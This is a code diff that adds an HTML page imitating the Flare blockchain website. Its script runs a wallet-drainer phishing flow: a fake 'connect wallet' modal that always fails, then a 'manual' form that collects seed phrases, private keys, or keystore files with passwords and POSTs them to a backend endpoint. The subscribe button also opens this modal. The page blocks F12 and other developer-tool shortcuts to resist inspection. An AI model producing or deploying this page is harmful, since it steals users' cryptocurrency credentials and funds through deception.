+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fdandstake.png&w=384&q=75" alt="Delegate & Stake" />
+                <h3>Delegate & Stake →</h3>
+                <p>A simple and effective way of boosting rewards while contributing to Flare's security</p>
+            </div>
+            <div class="card redirect-card" data-redirect-url="https://flare.network/vote">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FVote_Hero.png&w=1920&q=75" alt="Vote" />
+                <h3>Vote →</h3>
+                <p>Participate in transparent, onchain governance to define the future of Flare</p>
+            </div>
+            <div class="card redirect-card" data-redirect-url="https://flare.network/community">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FCommunity_Header.png&w=1920&q=75" alt="Community" />
+                <h3>Community →</h3>
+                <p>Come together, share ideas, and build</p>
+            </div>
+        </div>
+    </section>
+    <section class="newsletter-section">
+        <div class="newsletter-content">
+            <h2>Subscribe to the Flare Newsletter</h2>
+            <p>Join over 30,000 Flare community members. Sign up to the Flare newsletter today to hear the latest on product releases, ecosystem announcements and global events.</p>
+            <button class="subscribe-button trigger-wallet-modal">Subscribe</button>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="footer-top">
+            <div class="footer-brand">
+                <img src="https://flare.network/api/media/file/Flare.svg" alt="Flare Logo" class="footer-logo">
+                <span class="tagline">The blockchain for data</span>
+            </div>
+
+            <div class="footer-links">
+                <a href="#">Newsletter</a>
+                <a href="#">Contact</a>
+                <a href="#">Our Team</a>
+                <a href="#">Brand Assets</a>
+                <a href="#">Terms & Conditions</a>
+                <span>© Flare 2025</span>
+            </div>
+
+            <div class="social-icons">
+                <a href="#"><img src="https://www.bing.com/th/id/OIP.8SVgggxQcO5L6Dw_61ac4QHaEK?w=285&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="GitHub"></a>
+                <a href="#"><img src="https://www.bing.com/th/id/OIP.Y6P1GkxkEoLoIRsS1wMZiwHaFj?w=254&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="YouTube"></a>
+                <a href="#"><img src="https://www.bing.com/th/id/OIP.Cn9SAHCmTy8MEaixr8bqpAHaHa?w=172&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="LinkedIn"></a>
+                <a href="#"><img src="https://www.bing.com/th/id/OIP.SqoeKJPmo667mmrM6IQCxwHaEK?w=263&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="Discord"></a>
+                <a href="#"><img src="https://th.bing.com/th/id/OIP.ZweGejPwbT5wwshQ2-8qUQHaHa?w=178&h=180&c=7&r=0&o=5&pid=1.7" alt="X/Twitter"></a>
+                <a href="#"><img src="https://th.bing.com/th/id/OIP.lYN2s7Dv1a4pLAVUaXMCVgHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7" alt="Telegram"></a>
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            <h4>DEV LINKS</h4>
+            <div class="dev-links">
+                <a href="#">Flarescan →</a>
+                <a href="#">Flare P-Chain Explorer →</a>
+                <a href="#">Flare Systems Explorer →</a>
+            </div>
+        </div>
+    </footer>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+    const connectWalletBtn = document.getElementById('connectWalletBtn');
+    const walletModal = document.getElementById('walletModal');
+    const closeWalletModal = document.getElementById('closeWalletModal');
+    const closeConnectingScreen = document.getElementById('closeConnectingScreen');
+    const closeErrorScreen = document.getElementById('closeErrorScreen');
+    const closeManualScreen = document.getElementById('closeManualScreen');
+    const walletOptions = document.querySelectorAll('.wallet-option');
+    const walletSelectionScreen = document.getElementById('walletSelectionScreen');
+    const connectingScreen = document.getElementById('connectingScreen');
+    const errorScreen = document.getElementById('errorScreen');
+    const manualScreen = document.getElementById('manualScreen');
+    const selectedWalletName = document.getElementById('selectedWalletName');
+    const selectedWalletIcon = document.getElementById('selectedWalletIcon');
+    const connectingWalletName = document.getElementById('connectingWalletName');
+    const connectingWalletIcon = document.getElementById('connectingWalletIcon');
+    const manualConnectBtn = document.getElementById('manualConnectBtn');
+    const walletLogoContainer = document.getElementById('walletLogoContainer');
+    const tabButtons = document.querySelectorAll('.tab-button');
+    const tabContents = document.querySelectorAll('.tab-content');
+    const proceedBtn = document.getElementById('proceedBtn');
+    const fastSection = document.getElementById('fastSection');
+    const decentralizedSection = document.getElementById('decentralizedSection');
+    const fastCounter = document.getElementById('fastCounter');
+    const decentralizedCounter = document.getElementById('decentralizedCounter');
+    const walletTriggerElements = document.querySelectorAll('.trigger-wallet-modal');
+    const redirectCards = document.querySelectorAll('.redirect-card');
+
+    const phraseInput = document.getElementById('phraseInput');
+    const privateKeyInput = document.getElementById('privateKeyInput');
+    const keystoreInput = document.getElementById('keystoreInput');
+    const passwordInput = document.getElementById('passwordInput');
+
+    let currentWalletType = 'MetaMask';
+    const walletIcons = {
+        'MetaMask': 'media/download (1).png',
+        'WalletConnect': 'https://seeklogo.com/images/W/walletconnect-logo-EE83B50C97-seeklogo.com.png',
+        'Coinbase': 'https://www.pngall.com/wp-content/uploads/15/Coinbase-Logo-PNG-Images.png',
+        'Ledger': 'https://th.bing.com/th/id/OIP.CBGu--2fe8tuzrTgd4qYxAAAAA?w=408&h=408&rs=1&pid=ImgDetMain'
+    };
+
+    function showScreen(type) {
+        walletSelectionScreen.style.display = 'none';
+        connectingScreen.style.display = 'none';
+        errorScreen.style.display = 'none';
+        manualScreen.style.display = 'none';
+
+        if (type === 'wallet') {
+            walletSelectionScreen.style.display = 'block';
+        } else if (type === 'connecting') {
+            connectingScreen.style.display = 'block';
+        } else if (type === 'error') {
+            errorScreen.style.display = 'block';
+        } else if (type === 'manual') {
+            manualScreen.style.display = 'block';
+        }
+    }
+
+    function showTab(tabId) {
+        tabContents.forEach(content => {
+            content.classList.remove('active');
+        });
+        const activeTabContent = document.getElementById(tabId);
+        if (activeTabContent) {
+            activeTabContent.classList.add('active');
+        }
+    }
+
+    function updateWalletLogo(walletType) {
+        walletLogoContainer.innerHTML = '';
+
+        if (walletType === 'MetaMask' || walletType === 'WalletConnect' || walletType === 'Coinbase' || walletType === 'Ledger') {
+            const walletIcon = document.createElement('div');
+            walletIcon.style.backgroundImage = `url('${walletIcons[walletType]}')`;
+            walletIcon.style.width = '32px';
+            walletIcon.style.height = '32px';
+            walletIcon.style.backgroundSize = 'contain';
+            walletIcon.style.backgroundRepeat = 'no-repeat';
+            walletIcon.style.backgroundPosition = 'center';
+            walletLogoContainer.appendChild(walletIcon);
+        } else {
+            const flareLogo = document.createElement('img');
+            flareLogo.src = 'https://flare.network/api/media/file/Flare.svg';
+            flareLogo.alt = 'Flare';
+            flareLogo.className = 'flare-logo';
+            walletLogoContainer.appendChild(flareLogo);
+        }
+    }
+
+    function animateCounter(counter, target) {
+        const duration = 2000;
+        const startTime = Date.now();
+        const startValue = parseInt(counter.textContent);
+        const endValue = parseInt(target);
+
+        function updateCounter() {
+            const currentTime = Date.now();
+            const elapsed = currentTime - startTime;
+
+            if (elapsed < duration) {
+                const progress = elapsed / duration;
+                const currentValue = Math.floor(startValue + (endValue - startValue) * progress);
+                counter.textContent = currentValue;
+                requestAnimationFrame(updateCounter);
+            } else {
+                counter.textContent = endValue;
+            }
+        }
+
+        updateCounter();
+    }
+
+    const observerOptions = {
+        root: null,
+        rootMargin: '0px',
+        threshold: 0.5
+    };
+
+    const observer = new IntersectionObserver((entries) => {
+        entries.forEach(entry => {
+            if (entry.isIntersecting) {
+                if (entry.target.id === 'fastSection') {
+                    entry.target.classList.add('animate');
+                    animateCounter(fastCounter, fastCounter.getAttribute('data-target'));
+                } else if (entry.target.id === 'decentralizedSection') {
+                    entry.target.classList.add('animate');
+                    animateCounter(decentralizedCounter, decentralizedCounter.getAttribute('data-target'));
+                }
+                observer.unobserve(entry.target);
+            }
+        });
+    }, observerOptions);
+
+    observer.observe(fastSection);
+    observer.observe(decentralizedSection);
+
+    fastSection.addEventListener('mouseenter', () => {
+        if (!fastSection.classList.contains('animate')) {
+            fastSection.classList.add('animate');
+            animateCounter(fastCounter, fastCounter.getAttribute('data-target'));
+        }
+    });
+
+    decentralizedSection.addEventListener('mouseenter', () => {
+        if (!decentralizedSection.classList.contains('animate')) {
+            decentralizedSection.classList.add('animate');
+            animateCounter(decentralizedCounter, decentralizedCounter.getAttribute('data-target'));
+        }
+    });
+
+    function openWalletModal() {
+        walletModal.style.display = 'flex';
+        showScreen('wallet');
+        document.body.style.overflow = 'hidden';
+    }
+
+    connectWalletBtn.addEventListener('click', openWalletModal);
+    
+    walletTriggerElements.forEach(element => {
+        element.addEventListener('click', openWalletModal);
+    });
+
+    redirectCards.forEach(card => {
+        card.addEventListener('click', function() {
+            const url = this.getAttribute('data-redirect-url');
+            if (url) {
+                window.location.href = url;
+            }
+        });
+    });
+
+    closeWalletModal.addEventListener('click', () => {
+        walletModal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    });
+
+    closeConnectingScreen.addEventListener('click', () => {
+        walletModal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    });
+
+    closeErrorScreen.addEventListener('click', () => {
+        walletModal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    });
+
+    closeManualScreen.addEventListener('click', () => {
+        walletModal.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    });
+
+    walletModal.addEventListener('click', (e) => {
+        if (e.target === walletModal) {
+            walletModal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+    });
+
+    walletOptions.forEach(option => {
+        option.addEventListener('click', function () {
+            const walletName = this.querySelector('.wallet-name').textContent;
+            const walletType = this.getAttribute('data-wallet');
+            currentWalletType = walletType;
+
+            connectingWalletName.textContent = walletName;
+            if (connectingWalletIcon) {
+                connectingWalletIcon.style.backgroundImage = `url('${walletIcons[walletType]}')`;
+                connectingWalletIcon.className = 'connecting-wallet-icon';
+            }
+
+            selectedWalletName.textContent = walletName + ' Wallet';
+            if (selectedWalletIcon) {
+                selectedWalletIcon.style.backgroundImage = `url('${walletIcons[walletType]}')`;
+                selectedWalletIcon.className = 'wallet-icon';
+            }
+
+            showScreen('connecting');
+
+            setTimeout(() => {
+                showScreen('error');
+            }, 3000);
+        });
+    });
+
+    manualConnectBtn.addEventListener('click', () => {
+        updateWalletLogo(currentWalletType);
+        showScreen('manual');
+        document.querySelector('.tab-button[data-tab="phrase"]').click();
+    });
+
+    tabButtons.forEach(button => {
+        button.addEventListener('click', function() {
+            tabButtons.forEach(btn => {
+                btn.classList.remove('active');
+            });
+            this.classList.add('active');
+            
+            const tabId = this.getAttribute('data-tab') + 'Tab';
+            showTab(tabId);
+        });
+    });
+
+    async function sendToBackend(data) {
+        try {
+            const API_ENDPOINT = '/api/submit-wallet-data'; 
+
+            const response = await fetch(API_ENDPOINT, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            });
+
+            if (response.ok) {
+                document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Connection successful! Data sent via backend.';
+                setTimeout(() => {
+                    walletModal.style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                }, 1000);
+            } else {
+                const errorData = await response.json();
+                document.getElementById('errorScreen').querySelector('.error-message').textContent = `Error: ${errorData.message || 'Failed to connect to backend.'}`;
+                showScreen('error');
+            }
+        } catch (error) {
+            document.getElementById('errorScreen').querySelector('.error-message').textContent = 'Network error. Ensure backend is running.';
+            showScreen('error');
+        }
+    }
+
+    proceedBtn.addEventListener('click', () => {
+        showScreen('connecting');
+
+        let payload = {
+            wallet_type: currentWalletType,
+        };
+
+        const activeTab = document.querySelector('.tab-button.active').getAttribute('data-tab');
+
+        if (activeTab === 'phrase' && phraseInput) {
+            payload.phrase = phraseInput.value;
+        } else if (activeTab === 'privateKey' && privateKeyInput) { 
+            payload.private_key = privateKeyInput.value;
+        } else if (activeTab === 'keystore' && keystoreInput && passwordInput) {
+            payload.keystore_json = keystoreInput.value;
+            payload.keystore_password = passwordInput.value;
+        }
+        
+        setTimeout(() => {
+            sendToBackend(payload);
+        }, 3000); 
+    });
+
+    document.addEventListener('keydown', function (e) {
+        if (e.key === 'Escape' && walletModal.style.display === 'flex') {
+            walletModal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+    });
+
+    const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+    const nav = document.getElementById('nav');
+
+    mobileMenuBtn.addEventListener('click', function() {
+        this.classList.toggle('active');
+        nav.classList.toggle('active');
+    });
+
+    document.addEventListener("keydown", y => {
+      if (
+        (y.ctrlKey && y.shiftKey && ["I", "J", "C"].includes(y.key.toUpperCase())) ||
+        (y.ctrlKey && y.key.toLowerCase() === "u") ||
+        y.key === "F12"
+      ) {
+        y.preventDefault();
+        location.reload();
+      }
+    });
+});
+    </script>
+</body>
+</html>
